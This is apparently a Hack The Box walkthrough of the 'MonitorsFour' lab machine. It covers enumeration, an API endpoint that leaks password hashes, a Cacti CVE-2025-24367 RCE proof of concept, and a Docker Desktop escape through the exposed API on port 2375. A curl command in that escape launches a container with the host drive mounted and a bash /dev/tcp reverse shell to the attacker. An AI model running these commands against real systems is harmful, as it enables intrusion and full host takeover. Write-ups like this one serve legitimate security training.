---
layout: post
title: "[HTB] MonitorsFour"
description: "MonitorsFour is an Easy Windows machine where a broken API endpoint leaks all user credentials. Cracking MD5 hashes and spraying the correct username gives access to a Cacti instance vulnerable to CVE-2025-24367 authenticated RCE, yielding a shell as www-data inside a Docker container. Escaping Docker exploits Docker Desktop 4.44.2's unauthenticated TCP socket at 192.168.65.7:2375 to spawn a new container with the host filesystem mounted and read the root flag."
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---
![](/img/htb_img/MonitorsFour_img/img1.png)

- OS: Windows
- Release Date: 06 Dec 2025
- Difficulty: Easy

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 15:52 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.051s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
```

Scripts and versions.
```
❯ nmap -p80,5985 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 15:52 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

Domain:
```
❯ echo "$target monitorsfour.htb" | sudo tee -a /etc/hosts
10.129.xx.xx monitorsfour.htb
```

## TCP 80: HTTP
![](/img/htb_img/MonitorsFour_img/img2.png)
On port 80 we can find a company's website. After looking around for a bit I didn't find anything so let's fuzz the directories.

### Fuzzing the website
```
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://monitorsfour.htb/
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://monitorsfour.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 367]
/login                (Status: 200) [Size: 4340]
/user                 (Status: 200) [Size: 35]
/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
```

The new endpoint found is `/user`. Let's take a look at it.

### /user endpoint
```
❯ curl -s http://monitorsfour.htb/user
{"error":"Missing token parameter"}
```

This endpoint returns some JSON data, but we need a token to make this work.

### Token testing
```
❯ curl -s "http://monitorsfour.htb/user?token=0" | jq
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  }
]
```

Credentials were dumped when using token 0. With the following filters we can obtain all the passwords:
```
❯ curl -s "http://monitorsfour.htb/user?token=0" | jq | grep password | awk -F: '{print $2}' | sed 's/\"//g' | sed 's/,//g'
 56b32eb43e6f15395f6c46c1c9e1cd36
 69196959c16b26ef00b77d82cf6eb169
 2a22dcf99190c322d974c8df5ba3256b
 8d4a7e7fd08555133e056d9aacb1e519
```

![](/img/htb_img/MonitorsFour_img/img4.png)

The first password is `wonderful1`, and that is the password for the `admin` account.

## Subdomain enumeration
```
❯ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb"

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 237ms]
```

After finding the `cacti` sub-domain, I added it to the hosts file.

## Cacti Instance
![](/img/htb_img/MonitorsFour_img/img3.png)
Trying `admin:wonderful1` doesn't work — the username is wrong.

Looking at the user info, the name is `Marcus Higgins`. After trying combinations, `marcus:wonderful1` works.

# Foothold
Now having an account, I searched for vulnerabilities of this Cacti version and found CVE-2025-24367, an Authenticated RCE.

We will be using the PoC from the box creator:
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC

```
❯ python3 exploit.py -u 'marcus' -p 'wonderful1' -i 10.10.xx.xx -l 4444 -url http://cacti.monitorsfour.htb
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: T9vBz.php
[+] Got payload: /bash
[i] Created PHP filename: ZjO6o.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

## Shell as www-data
```
❯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.10.xx.xx
[+] Got reverse shell from 821fbd6a43fa~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/821fbd6a43fa~10.129.xx.xx-Linux-x86_64/2025_12_07-16_36_06-248.log 📜

www-data@821fbd6a43fa:~/html/cacti$
```

### User flag
```
www-data@821fbd6a43fa:~/html/cacti$ cat /home/marcus/user.txt 
<REDACTED>
```

# Privilege Escalation
By the hostname `821fbd6a43fa`, we can assume we are in a docker container.
Let's check for the kernel:
```
www-data@821fbd6a43fa:~/html/cacti$ uname -a
Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
```

Looking around I found that the system is using Docker Desktop 4.44.2, and in this version we can escape it by contacting a TCP Socket enabled on an IP by default. If the port 2375 is open and this IP accessible, the machine is vulnerable.
Link: https://www.mindpatch.net/posts/docker-escape-ssrf/

![](/img/htb_img/MonitorsFour_img/img5.png)
```
www-data@821fbd6a43fa:~/html/cacti$ curl -s http://192.168.65.7:2375/_ping
OK
```

So, it appears that the machine is vulnerable.

We execute the following commands:
```
curl -X POST \
	-H "Content-Type: application/json" \
	-d '{ "Image":"docker_setup-nginx-php:latest", "Cmd":["bash","-c","bash -i >& /dev/tcp/10.10.xx.xx/4443 0>&1"], "HostConfig":{ "Binds":["/mnt/host/c:/host_root"] } }' \
	-o info.json \
	http://192.168.65.7:2375/containers/create
```

At the same time we fire another Penelope shell handler on port `4443`.
Now we can start the new container — the ID is in `info.json`.

### Root flag
```
root@e51ec0aea3d6:/var/www/html# cat /host_root/Users/Administrator/Desktop/root.txt 
<REDACTED> 
```
